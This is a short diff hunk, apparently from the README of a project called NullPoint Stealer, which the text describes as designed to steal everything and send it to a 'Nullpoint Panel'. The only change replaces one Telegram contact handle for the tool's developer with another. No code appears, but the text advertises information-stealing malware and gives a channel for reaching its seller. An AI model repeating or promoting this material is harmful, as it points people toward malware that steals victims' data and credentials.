@@ -8,7 +8,7 @@ Nullpoint Stealer Designed To Steal Everything, And Send To Nullpoint Panel.
 
 
 
-Telegram Contact : https://t.me/ZeroTraceOfficial
+Telegram Contact : https://t.me/ZeroTraceDevOfficial
 
 
 # 🕳️ NullPoint Stealer
